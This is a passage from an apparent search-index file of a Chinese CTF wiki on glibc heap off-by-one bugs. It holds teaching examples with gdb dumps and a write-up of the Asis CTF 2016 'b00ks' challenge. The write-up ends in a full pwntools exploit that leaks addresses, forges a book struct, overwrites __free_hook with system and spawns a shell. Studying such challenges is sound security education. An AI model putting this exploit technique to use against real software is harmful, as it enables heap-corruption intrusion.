\u540e\u4e24\u884c\u4ee3\u7801\u5728\u6700\u65b0\u7248\u672c\u4e2d\u52a0\u5165\uff0c\u5219 2 \u7684\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u65e0\u6cd5\u4f7f\u7528\uff0c\u4f46\u662f 2.28 \u53ca\u4e4b\u524d\u90fd\u6ca1\u6709\u95ee\u9898 */ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); }","title":"off-by-one \u5229\u7528\u601d\u8def"},{"location":"glibc-heap/off_by_one/#1","text":"int my_gets(char *ptr,int size) { int i; //\u8fd9\u91cc\u5199\u6210\u5c0f\u4e8e\u7b49\u4e8e\u5bfc\u81f4\u53ef\u4ee5\u591a\u5199\u5165\u4e00\u4e2a\u5b57\u8282 for(i=0;i<=size;i++) { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2a off-by-one \u6f0f\u6d1e\uff0c\u539f\u56e0\u662f for \u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef wikipedia: \u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f 30 \u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u9694 3 \u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u6848 10 \u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u6709 10 \u4e2a\u95f4\u9694\uff0c11 \u6761\u6805\u680f\u67f1\u3002 \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a 16 \u5b57\u8282\u7684\u5806\u5757 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000","title":"\u793a\u4f8b 1"},{"location":"glibc-heap/off_by_one/#2","text":"\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff08\u4e0d\u8003\u8651\u6808\u6ea2\u51fa\uff09\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002 \u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86 off-by-one \u7684\u53d1\u751f\u3002 strlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c strlen \u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 \\x00 \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 \\x00 \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411 chunk1 \u4e2d\u5199\u5165\u4e86 25 \u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528 gdb \u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk \u5728\u6211\u4eec\u8f93\u5165'A'*24 \u540e\u6267\u884c strcpy 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400(11) \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 '\\x00' \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one ^3 \uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002 \u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684 CPU \u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2a DWORD \u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684 DWORD 0x41424344 \u5185\u5b58 0x44,0x43,0x42,0x41","title":"\u793a\u4f8b 2"},{"location":"glibc-heap/off_by_one/#1-asis-ctf-2016-b00ks","text":"WiKi\u4e0a\u6ca1\u6709\u660e\u786e\u8bf4\u660e\u9898\u76ee\u7684\u73af\u5883\uff0c\u591a\u65b9\u786e\u8ba4\u540e\uff1a\u5982\u679c\u4f7f\u7528\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u73af\u5883\u5e94\u8be5\u662f ubuntu 18 ;\u5982\u679c\u4f7f\u7528 unlink \u4e5f\u5c31\u662f wiki \u4e2d\u7684\u7b80\u6d01\u65b9\u6848\uff0cubuntu16&18\u3002 \u4ee5\u4e0b wp \u5173\u4e8e\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u65b9\u6cd5\u90fd\u66ff\u6362\u4e3a\u6211\u81ea\u5df1\u7684\u7248\u672c","title":"\u5b9e\u4f8b 1: Asis CTF 2016 b00ks"},{"location":"glibc-heap/off_by_one/#_2","text":"\u9898\u76ee\u662f 64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"glibc-heap/off_by_one/#_3","text":"\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002 1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit \u8fdb\u5165\u7a0b\u5e8f\u8981\u6c42\u8f93\u5165\u4e00\u4e2a author name \u957f\u5ea6\u8981\u6c42\u4e0d\u5927\u4e8e32\u3002 \u6bcf\u672c\u4e66\uff08chunk\uff09\u4fe1\u606f\u7528\u5927\u5c0f\u4e3a 0x20 \u7684 book \u7ed3\u6784\u4f53\u6765\u7ef4\u62a4\uff0c\u5176\u4e2d name \u548c description \u5728\u5806\u4e0a\u5206\u914d\uff0c\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u662f\u5730\u5740\u6307\u9488\u3002book_name\u3001book_description \u5927\u5c0f\u81ea\u5b9a\u4e14\u65e0\u9650\u5236\u5927\u5c0f\u3002 \u8be6\u7ec6\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a\uff08\u4ece my_create \u51fd\u6570\u4e2d\u7ed3\u5c3e\u53ef\u63a8\u51fa\u7ed3\u6784\u4f53\uff0c\u4e0b\u9762\u662f\u7b80\u5316\u8fc7\u7684\uff09 struct book { int id; //8bit char *book_name; //8bit char *book_description; //8bit int size; //8bit } \u7ed3\u6784\u4f53\u7533\u8bf7\u597d\u540e\uff0c\u540c\u4e00\u653e\u7f6e\u5230 off_202010 \u5217\u8868\u4e2d\u7ba1\u7406\u3002 *((_QWORD *)off_202010 + v2) = book;","title":"\u7a0b\u5e8f\u529f\u80fd"},{"location":"glibc-heap/off_by_one/#_4","text":"\u7a0b\u5e8f\u7f16\u5199\u5b9a\u4e49\u7684\u8bfb\u5165\u51fd\u6570 sub_9F5() \u5b58\u5728 null byte off-by-one \uff08\u540e\u6587\u79f0\u8be5\u51fd\u6570\u4e3a my_read() \uff09\u3002\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\u6e90\u7801\uff0c\u6ce8\u610f\u7559\u610f\u6700\u540e\u4e00\u6b21\u5faa\u73af\u7684\u8fb9\u754c\u8f93\u5165\u3002 signed __int64 __fastcall my_read(_BYTE *a1, int a2) { int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 <= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) { if ( (unsigned int)read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == 10 ) break; ++buf; if ( i == a2 ) //\u6ca1\u6709\u6b63\u786e\u5904\u7406\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u5199\u5165\u4f4d\u7f6e break; } *buf = 0; //\u6f0f\u6d1e\u70b9 return 0LL; } \u5bf9\u6bd4\u4e00\u4e0b\u5176\u4ed6\u8c03\u7528 my_read \u51fd\u6570\u7684\u53c2\u6570\u5c31\u77e5\u9053\u4e3a\u4ec0\u4e48\u8f93\u5165 author name \u4f1a\u51fa\u73b0 off-b-null \uff1a description \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 name \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 \u4f46\u662f my_name \u53ef\u4ee5\u653e 32 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a 32 \uff0c\u6ca1\u6709\u4e3a\u6700\u540e\u7ed3\u675f\u7b26\u9884\u7559\u4e00\u4e2a\u4f4d\u7f6e\u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"glibc-heap/off_by_one/#_5","text":"","title":"\u601d\u8def"},{"location":"glibc-heap/off_by_one/#_6","text":"\u6211\u4eec\u5148\u770b\u770b author name \u6ea2\u51fa\u7684 \\x00 \u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\u3002\u5148\u4e00\u6bb5\u8c03\u8bd5\u7684 exp \uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5728\u811a\u672c\u4e2d\uff0c\u8f93\u5165 author name \u4e3a \"a\"*0x32 \uff0c\u5728\u7533\u8bf7\u4e00\u4e2a book \uff0c\u6700\u540e\u624d\u8c03\u7528 gdb \uff0c\u7a0b\u5e8f\u6253\u5f00 PIE \u4fdd\u62a4\u6211\u4eec\u5c31\u6253\u4e00\u4e2a\u65ad\u70b9\uff0c\u65b9\u4fbf\u8ba1\u7b97\u504f\u79fb\u627e\u5230 name \uff1a gdb.attach(p,\"b *$rebase(0x0B94)\") \u3002 \u5148\u627e\u5230 name \u548c chunk_list \u771f\u5b9e\u5730\u5740\uff1a chunk_list \u5728\u4f4e\u5730\u5740\uff0c\u4ece\u5b83\u5f00\u59cb\u67e5\u5185\u5b58\uff1a \u53ef\u4ee5\u770b\u5230\u5b9e\u9645\u4e0a\u4e0d\u662f\u4ece chunk_list \u5f00\u59cb\u5b58\u653e\u7ed3\u6784\u4f53\u6307\u9488\uff0c\u800c\u662f\u5b9a\u5411\u5230\u4e86 0x555555756060 \uff0c\u4ece\u8fd9\u91cc\u5f00\u59cb\u8bb0\u5f55\u7ed3\u6784\u4f53\u6307\u9488\uff08\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e24\u4e2a book \uff09\u3002\u7136\u540e\u6211\u4eec\u89c2\u5bdf name \uff0c\u5728\u7ed3\u6784\u4f53\u6307\u9488\u524d\u9762\uff0cname \u6ea2\u51fa\u7684\u4f1a\u8986\u76d6\u6389 book1 \u7ed3\u6784\u4f53\u6307\u9488\u3002\u6211\u4eec\u7ed9\u4e00\u6b21 name \u770b\u770b\u6548\u679c\uff1a \u8fd9\u6837\u6ea2\u51fa\u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u53bb 0x0000555555758300 \u627e book1 \u8d44\u6599\uff0c\u800c\u4e0d\u662f 0x0000555555758330 \u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u80fd\u591f\u5728 0x0000555555758300 \u4f2a\u9020\u4e00\u4e2a book \u7ed3\u6784\u4f53\uff0c\u5c31\u80fd\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u8f93\u51fa&\u4fee\u6539\u529f\u80fd\uff0c\u5b9e\u73b0\u4efb\u610f\u8bfb\u5199\u3002\u7a0b\u5e8f\u662f Full RELRO \uff0c\u5c31\u5199 hook \u3002\u5927\u6982\u601d\u8def\u5c31\u662f\u8fd9\u4e48\u4e2a\u601d\u8def\uff0c\u653b\u51fb\u6d41\u7a0b\uff1a author name \u586b\u5145 0x20 bit\uff0c\u8986\u76d6\u7ed3\u675f\u7b26 creat boo1 && book2 print book1 info \u4ece author name \u6cc4\u9732 book1 \u7ed3\u6784\u4f53\u5730\u5740 edit book1 description \u586b\u5165 payload\uff0c\u6784\u5efa fake book1 \u7ed3\u6784\u4f53 change author name \u8986\u76d6 book1 \u6307\u9488\uff0c\u8ba9\u5176\u6307\u5411 fake book1 print book1 info \u6cc4\u9732 book2 \u5730\u5740\uff08mmap\u5730\u5740\uff09 edit book1 \u6765\u4fee\u6539 book2 *description \u6307\u5411 free_hook edit book2 \u4fee\u6539 free_hook \u4e3a one_gadget","title":"\u6ea2\u51fa\u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\uff1f"},{"location":"glibc-heap/off_by_one/#book1","text":"\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684 my_read \u51fd\u6570\u5b58\u5728 null byte off-by-one \uff0c\u4e8b\u5b9e\u4e0a my_read \u8bfb\u5165\u7684\u7ed3\u675f\u7b26 '\\x00' \u662f\u5199\u5165\u5230 0x555555756060 \u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f53 0x555555756060\uff5e0x555555756068 \u5199\u5165 book \u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26 '\\x00' \uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370 author name \u5c31\u53ef\u4ee5\u83b7\u5f97 pointer array \u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002 0x555555756040: 0x4141414141414141 0x4141414141414141 0x555555756050: 0x4141414141414141 0x4141414141414141 <== author name 0x555555756060: 0x0000555555758330 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728 author name \u4e2d\u9700\u8981\u8f93\u5165 32 \u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efa book1 \uff0c\u8fd9\u4e2a book1 \u7684\u6307\u9488\u4f1a\u8986\u76d6 author name \u4e2d\u6700\u540e\u7684 NULL \u5b57\u8282\uff0c\u4f7f\u5f97\u8be5\u6307\u9488\u4e0e author name \u76f4\u63a5\u8fde\u63a5\uff0c\u8fd9\u6837\u8f93\u51fa author name \u5219\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u5806\u6307\u9488\u3002 createname(\"A\"*32) createbook(128,\"a\"*8,32,\"b\"*8) createbook(0x21000,\"/bin/sh\\x00\",0x21000,\"d\"*8) # getshell\u7528\u968f\u5e26\u4e5f\u5148\u7533\u8bf7\uff0c\u5bf9\u672c\u6b65\u6ca1\u6709\u5f71\u54cd book_id_1,book_name,book_des,book_author=printbook(1) book1_addr=u64(book_author[32:32+6].ljust(8,'\\x00'))","title":"\u6cc4\u6f0f book1 \u7ed3\u6784\u4f53\u5730\u5740"},{"location":"glibc-heap/off_by_one/#_7","text":"\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cd change \u529f\u80fd\uff0c change \u529f\u80fd\u7528\u4e8e\u4fee\u6539 author name \uff0c\u6240\u4ee5\u901a\u8fc7 change \u53ef\u4ee5\u5199\u5165 author name \uff0c\u5229\u7528 off-by-one \u8986\u76d6 book1 \u7684\u4f4e\u5b57\u8282\u3002 \u8986\u76d6\u6389 book1 \u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411 book1 \u7684 description [^4]\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86 edit \u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 description \u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728 description \u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2a book \u7ed3\u6784\uff0c\u8fd9\u4e2a book \u7ed3\u6784\u7684 description \u548c name \u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002 [^4]:\u4e3a\u5565\u521a\u521a\u597d\u5c31\u662f\u5728 book1 desc \u91cc\u9762\uff1f\u901a\u8fc7\u8c03\u8bd5\u5457\u3002\u6ce8\u610f\u5728 Ubuntu 16 \u8fd9\u91cc\u65e0\u6cd5\u5b9e\u73b0\u6307\u5411 book1 desc \uff0c\u8bf7\u770b\u7ed3\u5c3e\u8865\u5145 \u8fd9\u91cc\u5728 description \u4e2d\u4f2a\u9020\u4e86 book \uff0c\u4f7f\u7528\u7684\u6570\u636e\u662f p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) \u3002 \u5176\u4e2d book1_addr+0x38 \u6307\u5411 book2 \u7684 book_name \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff1bbook1_addr+0x40 \u6307\u5411 book2 \u7684 book_desc \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 book2 \u6307\u9488\u503c\u3002 \u8fd9\u6837\u5c31\u662f\u5b9e\u73b0 edit book1 \u4fee\u6539 book2 \u6307\u9488\u5730\u5740\uff0cedit book2 \u4fee\u6539\u4efb\u610f\u5730\u5740 log.success(\"book2_name_addr:\"+hex(book1_addr+0x38)) log.success(\"book2_desc_addr:\"+hex(book1_addr+0x40)) payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) editbook(book_id_1,payload) # write fakechunk","title":"\u4f2a\u9020\u7ed3\u6784\u4f53"},{"location":"glibc-heap/off_by_one/#libc","text":"\u524d\u9762\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199 got \u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199 __malloc_hook \u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542f PIE \u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0f libc \u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002 \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2a book \u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5 mmap \u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662f brk \u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662f mmap \u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528 mmap \u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3a mmap \u5206\u914d\u7684\u5185\u5b58\u4e0e libc \u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51fa libc \u7684\u57fa\u5730\u5740\u3002 pwndbg> x /4gx 0x0000555555758360 0x555555758360: 0x0000000000000002 0x00007ffff7fbc010 0x555555758370: 0x00007ffff7f9a010 0x0000000000021000 pwndbg> vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555556000 r-xp 2000 0 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555755000 0x555555756000 r--p 1000 1000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555756000 0x555555757000 rw-p 1000 2000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555757000 0x555555778000 rw-p 21000 0 [heap] 0x7ffff79e4000 0x7ffff7bcb000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7f9a000 0x7ffff7fe0000 rw-p 46000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack] 0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"glibc-heap/off_by_one/#__free_hook","text":"\u53ef\u4ee5\u5199\u5165 onegadget \u4e5f\u53ef\u4ee5\u662f system \uff0c\u5982\u679c\u662f system \uff0c\u9700\u8981 free \u7684 book_name \u662f /bin/sh \u6765\u4f20\u5165\u53c2\u6570\u3002","title":"\u5199\u5165 __free_hook"},{"location":"glibc-heap/off_by_one/#exploit","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe\u3001CTF-WIKI # @Email : skye231@foxmail.com # @File : b00ks.py from pwn import * context.log_level=\"debug\" p=process(\"./b00ks\") elf=ELF(\"b00ks\") libc=ELF(\"./libc.so.6\") def createbook(name_size,name,des_size,des): p.readuntil(\"> \") p.sendline(\"1\") p.readuntil(\": \") p.sendline(str(name_size)) p.readuntil(\": \") p.sendline(name) p.readuntil(\": \") p.sendline(str(des_size)) p.readuntil(\": \") p.sendline(des) def printbook(id): p.readuntil(\"> \") p.sendline(\"4\") p.readuntil(\": \") for i in range(id): book_id=int(p.readline()[:-1]) p.readuntil(\": \") book_name=p.readline()[:-1] p.readuntil(\": \") book_des=p.readline()[:-1] p.readuntil(\": \") book_author=p.readline()[:-1] return book_id,book_name,book_des,book_author def createname(name): p.readuntil(\"name: \") p.sendline(name) def changename(name): p.readuntil(\"> \") p.sendline(\"5\") p.readuntil(\": \") p.sendline(name) def editbook(book_id,new_des): p.readuntil(\"> \") p.sendline(\"3\") p.readuntil(\": \") p.writeline(str(book_id)) p.readuntil(\": \") p.sendline(new_des) def deletebook(book_id): p.readuntil(\"> \") p.sendline(\"2\") p.readuntil(\": \") p.sendline(str(book_id)) # leak chunk1_stuct addr createname(\"A\"*32) #gdb.attach(p,\"b *$rebase(0x0B94)\") createbook(128,\"a\"*8,32,\"b\"*8) createbook(0x21000,\"/bin/sh\\x00\",0x21000,\"d\"*8) book_id_1,book_name,book_des,book_author=printbook(1) book1_addr=u64(book_author[32:32+6].ljust(8,'\\x00')) log.success(\"book1_address:\"+hex(book1_addr)) # set fake chunk log.success(\"book2_name_addr:\"+hex(book1_addr+0x38)) log.success(\"book2_desc_addr:\"+hex(book1_addr+0x40)) payload=p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) editbook(book_id_1,payload) # overwrite chunk1_stuct addr 2 fake chunk changename(\"A\"*32) book_id_1,book_name,book_des,book_author=printbook(1) book2_name_addr=u64(book_name.ljust(8,\"\\x00\")) book2_des_addr=u64(book_des.ljust(8,\"\\x00\")) log.success(\"book2 name addr:\"+hex(book2_name_addr)) log.success(\"book2 des addr:\"+hex(book2_des_addr)) libc_base=book2_des_addr-0x5b6010#0x5b9010 log.success(\"libc base:\"+hex(libc_base)) free_hook=libc_base+libc.symbols[\"__free_hook\"] log.success(\"free_hook:\"+hex(free_hook)) system = libc_base+libc.symbols[\"system\"] ''' ne_gadget=libc_base+0x4f3c2 #0x4f2c5 0x10a38c 0x4f322 log.success(\"one_gadget:\"+hex(one_gadget)) ''' # overwrite free_hook # set chunk2_desc 2 free_hook editbook(1,p64(free_hook)) # overwrite free_hook 2 system editbook(2,p64(system)) deletebook(2) p.interactive()","title":"exploit"},{"location":"glibc-heap/off_by_one/#_8","text":"\u5728\u4efb\u610f\u8bfb\u5199\u4e4b\u540e\uff0c\u53e6\u4e00\u79cd\u627e\u5230 libc \u7684\u65b9\u6848\u5176\u5b9e\u662f\u53ef\u4ee5\u5728\u8fdb\u884c\u4efb\u610f\u8bfb\u5199\u4e4b\u524d\u9996\u5148\u9020\u6210 libc 